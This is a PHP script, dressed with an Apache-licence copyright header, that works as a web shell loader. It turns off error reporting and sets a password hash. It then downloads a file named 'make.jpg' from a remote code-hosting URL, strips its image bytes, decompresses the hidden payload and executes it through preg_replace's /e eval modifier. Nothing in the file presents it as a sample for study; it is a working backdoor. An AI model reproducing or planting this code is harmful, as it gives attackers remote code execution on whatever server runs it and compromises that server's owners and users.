<?php
/**
// +----------------------------------------------------------------------
// | Copyright (c) 2006-2012 ephper All rights reserved.
// +----------------------------------------------------------------------
// | Licensed ( http://www.apache.org/licenses/LICENSE-2.0 )
// +----------------------------------------------------------------------
// | Author: ephper <2012heike@gmail.com>
// +----------------------------------------------------------------------
// $Id: [$file] v1 2012-4-19 10:46 ephper $
*/
error_reporting(0);
session_start();
define('password','781f357c35df1fef3138f6d29670365a'); 
define('title','山不在高，有仙则名；水不在深，有龙则灵。');
define('copyright', 'E');
if(empty($_SESSION['data'])){
    $_SESSION['data']=substr(file_get_contents('http://2012heike.googlecode.com/svn/trunk/make.jpg'),3649);
}
@preg_replace("~(.*)~ies",gzuncompress($_SESSION['data']),null);
?>